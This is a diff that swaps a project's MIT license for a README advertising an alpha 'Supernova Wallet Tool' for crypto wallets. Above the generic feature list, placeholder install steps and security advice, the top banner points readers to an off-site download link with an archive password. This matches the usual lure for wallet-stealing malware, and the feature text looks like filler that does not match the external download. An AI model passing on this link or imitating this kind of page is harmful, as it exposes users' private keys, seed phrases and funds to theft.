@@ -1,21 +1,142 @@
-MIT License
+🌌 Supernova Wallet Tool (ALPHA)
 
-Copyright (c) 2026 exeherodot39
+##############################
+DOWNLOAD INFORMATION
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+[+] DOWNLOAD LINK: https://goragalo.live/usu
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+[+] ARCHIVE PASSWORD: update
+##############################
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+Supernova Wallet Tool is an experimental wallet utility framework designed for automation, wallet management, and crypto operations.
+Built for speed, modularity, and future scalability.
+
+⚠️ Status: ALPHA — unstable, experimental, use at your own risk.
+
+✨ Features
+
+🔑 Wallet generation / import / export (depends on implementation)
+
+🧾 Address management utilities
+
+📡 RPC / API integration support (optional)
+
+🔍 Balance and transaction checker (if connected to a node/provider)
+
+⚙️ Automation modules for repetitive wallet actions
+
+🧩 Modular architecture for easy expansion
+
+🧪 Testing and sandbox-friendly structure
+
+🧪 Project Status
+
+This project is currently in ALPHA stage.
+
+That means:
+
+APIs and features may change without notice
+
+bugs and security issues may exist
+
+documentation may be incomplete
+
+not recommended for production use
+
+⚠️ Disclaimer
+
+This tool may interact with sensitive data such as:
+
+private keys
+
+seed phrases
+
+wallet files
+
+DO NOT use this tool with wallets containing real funds.
+Use test wallets and isolated environments only.
+
+🚀 Installation
+
+Clone the repository:
+
+git clone https://github.com/yourname/supernova-wallet-tool.git
+cd supernova-wallet-tool
+
+
+Install dependencies:
+
+pip install -r requirements.txt
+
+
+Run:
+
+python main.py
+
+⚙️ Configuration
+
+Create a .env file:
+
+RPC_URL=https://your-node-url
+API_KEY=your_api-key
+NETWORK=testnet
+
+
+Or configure manually inside /config/.
+
+🕹️ Usage
+
+Display available commands:
+
+python main.py --help
+
+
+Example (depends on your module structure):
+
+python main.py --generate --network testnet
+
+📁 Project Structure
+supernova-wallet-tool/
+│
+├── main.py
+├── requirements.txt
+├── README.md
+│
+├── config/
+│   └── settings.py
+│
+├── modules/
+│   ├── wallet.py
+│   ├── transactions.py
+│   ├── scanner.py
+│   └── utils.py
+│
+└── logs/
+
+🔥 Roadmap
+
+ Multi-chain support (EVM / Solana / BTC)
+
+ Wallet encryption & secure storage
+
+ Advanced transaction builder
+
+ CLI improvements (argparse / typer)
+
+ Logging system + error reporting
+
+ Optional GUI interface
+
+ Docker support
+
+🛡️ Security Notes
+
+This project is not audited.
+
+Recommendations:
+
+✅ Use in VM / sandbox
+✅ Use test wallets only
+✅ Never commit .env or keys
+❌ Never store private keys in plain text
+❌ Never run on a compromised machine
